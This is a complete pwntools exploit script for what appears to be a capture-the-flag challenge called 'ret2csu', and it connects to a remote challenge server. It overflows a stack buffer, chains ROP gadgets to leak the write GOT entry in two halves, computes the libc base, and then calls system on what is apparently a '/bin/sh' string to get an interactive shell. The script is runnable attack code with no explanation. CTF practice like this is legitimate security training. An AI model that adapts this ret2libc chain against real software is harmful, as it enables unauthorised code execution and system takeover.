from pwn import *

io = remote("node5.anna.nssctf.cn", 24426)
# io = process('ret2csu')
elf = ELF('ret2csu')
libc = ELF('libc.so.6')
context(log_level='debug')
pop_rdi = 0x4012b3
ret = 0x40101a
rsi_r15 = 0x4012b1

# leak high 4 bytes and low 4 bytes of write
io.sendlineafter(b'Input:', b'A' * (0x100 + 0x08) + p64(pop_rdi) + p64(1) + p64(rsi_r15) + p64(elf.got['write']) + p64(0) + p64(elf.plt['write']) + p64(elf.sym['vuln']))
io.recvuntil(b'Ok.\n')
got_write_0 = u32(io.recvuntil(b'Input', drop=True).ljust(4, b'\x00'))
print("got_write_0: ", hex(got_write_0))
io.sendline(b'A' * (0x100 + 0x08) + p64(pop_rdi) + p64(1) + p64(rsi_r15) + p64(elf.got['write'] + 4) + p64(0) + p64(elf.plt['write']) + p64(elf.sym['vuln']))
io.recvuntil(b'Ok.\n')
got_write_1 = u32(io.recvuntil(b'Input', drop=True).ljust(4, b'\x00'))
print("got_write_1: ", hex(got_write_1))
got_write = got_write_0 | (got_write_1 << 32)
print("got_write: ", hex(got_write))

libc_base = got_write - libc.sym['write']
print("libc_base: ", hex(libc_base))

io.sendline(b'A' * (0x100 + 0x08) + p64(ret) + p64(pop_rdi) + p64(libc_base + 0x1D8698) + p64(libc_base + libc.sym["system"]) + p64(elf.sym['vuln']))
io.interactive()